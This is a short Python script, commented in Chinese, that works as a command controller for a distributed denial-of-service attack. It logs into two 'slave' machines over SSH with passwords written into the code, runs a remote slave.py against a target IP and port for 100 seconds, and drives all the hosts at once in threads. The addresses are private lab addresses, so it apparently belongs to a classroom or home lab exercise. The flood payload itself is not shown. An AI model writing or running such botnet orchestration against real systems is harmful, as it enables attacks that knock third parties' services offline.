import paramiko
import time
import threading

def run_attack_on_slave(slave_ip, username, password, remote_script_path, target_ip, target_port, duration):
    print(f"連線至 {slave_ip} ({username}) ...")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(slave_ip, username=username, password=password)
        print("連線成功")

        command = f"python3 {remote_script_path} {target_ip} {target_port} {duration}"
        print(f"執行攻擊命令: {command}")
        
        stdin, stdout, stderr = ssh.exec_command(command)
        print("攻擊執行中")
        
        # 非阻塞地讀取輸出
        time.sleep(duration)

        output = stdout.read().decode()
        error = stderr.read().decode()
        if output:
            print(f"[{slave_ip}] 輸出:\n{output}")
        if error:
            print(f"[{slave_ip}] 錯誤訊息:\n{error}")

    except Exception as e:
        print(f"連線或執行錯誤: {e}")
    finally:
        ssh.close()
        print(f"斷開 {slave_ip} 連線\n")


# slave資訊
slaves = [
    {"ip": "192.168.56.102", "username": "kali", "password": "kali", "remote_path": "/home/kali/桌面/slave.py"},
    {"ip": "192.168.56.104", "username": "li", "password": "kali", "remote_path": "/home/li/桌面/slave.py"},
]

target_ip = "192.168.56.101"
target_port = 12345
duration = 100

# multithread攻擊
threads = []

for slave in slaves:
    t = threading.Thread(target=run_attack_on_slave, kwargs={
        "slave_ip": slave["ip"],
        "username": slave["username"],
        "password": slave["password"],
        "remote_script_path": slave["remote_path"],
        "target_ip": target_ip,
        "target_port": target_port,
        "duration": duration
    })
    t.start()
    threads.append(t)

for t in threads:
    t.join()
